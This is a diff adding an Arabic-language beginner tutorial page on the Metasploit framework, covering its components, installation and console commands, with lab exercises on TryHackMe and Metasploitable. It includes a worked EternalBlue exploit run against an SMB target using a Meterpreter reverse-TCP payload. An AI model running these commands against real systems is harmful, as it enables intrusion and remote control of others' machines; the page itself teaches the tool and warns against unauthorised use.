@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Metasploit | MT ERO</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="../css/style.css">
+</head>
+<body>
+    <header><div class="logo">MT <span>| ERO</span></div><nav><ul><li><a href="../index.html">الرئيسية</a></li><li><a href="../index.html#tools">الأدوات</a></li></ul></nav></header>
+    <div class="tool-page">
+        <a href="../index.html#tools" class="back-btn"><i class="fas fa-arrow-right"></i> رجوع للأدوات</a>
+        <div class="tool-header">
+            <span class="tool-icon-big"><i class="fas fa-crosshairs"></i></span>
+            <h1>Metasploit</h1>
+            <p>أشهر إطار لاستغلال الثغرات</p>
+        </div>
+        <div class="tool-content">
+            <h2><i class="fas fa-book"></i> يعني إيه Metasploit؟</h2>
+            <p>Metasploit Framework هي أشهر أداة مفتوحة المصدر لاستغلال الثغرات الأمنية. بتوفر قاعدة ضخمة من الـ Exploits (أكواد استغلال) والـ Payloads والـ Auxiliary modules.</p>
+            <p>الأداة دي بتعتبر الأساس في أي عملية اختبار اختراق متقدمة — وفيها أكتر من 2000 exploit جاهز. وكمان بتدعم عدد كبير من الأنظمة والخدمات.</p>
+
+            <h3><i class="fas fa-check-circle"></i> المكونات</h3>
+            <ul>
+                <li><strong>Exploits:</strong> أكواد استغلال الثغرات</li>
+                <li><strong>Payloads:</strong> الأكواد اللي بتتنفذ بعد الاستغلال</li>
+                <li><strong>Auxiliary:</strong> أدوات مساعدة (Scanning, Fuzzing)</li>
+                <li><strong>Encoders:</strong> تشفير الـ Payloads</li>
+                <li><strong>Post:</strong> أوامر بعد الاستغلال</li>
+            </ul>
+
+            <h2><i class="fas fa-cog"></i> التثبيت</h2>
+            <div class="code-block" data-lang="Kali"><code><span class="comment"># مش هتشتغل على Termux بسهولة</span>
+<span class="comment"># استخدمها على Kali Linux أو TryHackMe</span>
+
+<span class="comment"># على Kali Linux</span>
+sudo apt install metasploit-framework
+msfconsole</code></div>
+
+            <h2><i class="fas fa-bullseye"></i> الأوامر الأساسية</h2>
+            <h3>1. تشغيل Metasploit</h3>
+            <div class="code-block" data-lang="Bash"><code>msfconsole</code></div>
+
+            <h3>2. البحث عن Exploit</h3>
+            <div class="code-block" data-lang="Bash"><code>search type:exploit platform:windows smb</code></div>
+
+            <h3>3. استخدام Exploit</h3>
+            <div class="code-block" data-lang="Bash"><code>use exploit/windows/smb/ms17_010_eternalblue</code></div>
+
+            <h3>4. عرض الخيارات</h3>
+            <div class="code-block" data-lang="Bash"><code>show options</code></div>
+
+            <h3>5. تعيين الهدف</h3>
+            <div class="code-block" data-lang="Bash"><code>set RHOSTS 192.168.1.1
+set LHOST 192.168.1.4
+set PAYLOAD windows/x64/meterpreter/reverse_tcp</code></div>
+
+            <h3>6. التنفيذ</h3>
+            <div class="code-block" data-lang="Bash"><code>exploit</code></div>
+
+            <h2><i class="fas fa-list"></i> أوامر msfconsole</h2>
+            <ul>
+                <li><code>help</code> — المساعدة</li>
+                <li><code>search</code> — البحث</li>
+                <li><code>use</code> — استخدام Module</li>
+                <li><code>show options</code> — الخيارات</li>
+                <li><code>set</code> — تعيين قيمة</li>
+                <li><code>exploit</code> أو <code>run</code> — التنفيذ</li>
+                <li><code>sessions</code> — الجلسات المفتوحة</li>
+                <li><code>back</code> — رجوع</li>
+                <li><code>exit</code> — خروج</li>
+            </ul>
+
+            <div class="info-box danger"><strong><i class="fas fa-exclamation-triangle"></i> خطر:</strong> Metasploit أداة قوية جداً. استخدامها على أي نظام مش بتاعك = جريمة.</div>
+
+            <h2><i class="fas fa-dumbbell"></i> تمارين</h2>
+            <ol>
+                <li>سجّل في TryHackMe وادخل Metasploit room</li>
+                <li>جرب Metasploit على Metasploitable</li>
+                <li>اتعلم Meterpreter</li>
+            </ol>
+
+            <h2><i class="fas fa-link"></i> مصادر</h2>
+            <ul>
+                <li><a href="https://tryhackme.com/room/metasploitintro" target="_blank" style="color: #00d4ff;">TryHackMe Metasploit</a></li>
+                <li><a href="https://www.metasploit.com/" target="_blank" style="color: #00d4ff;">Metasploit Official</a></li>
+            </ul>
+        </div>
+    </div>
+    <footer><div class="footer-content"><div class="footer-logo">MT ERO</div><p class="copyright">© 2025 MT ERO.</p></div></footer>
+    <a href="https://t.me/Mozex_3" target="_blank" class="telegram-float"><i class="fab fa-telegram"></i></a>
+    <script src="../js/main.js"></script>
+</body>
+</html>
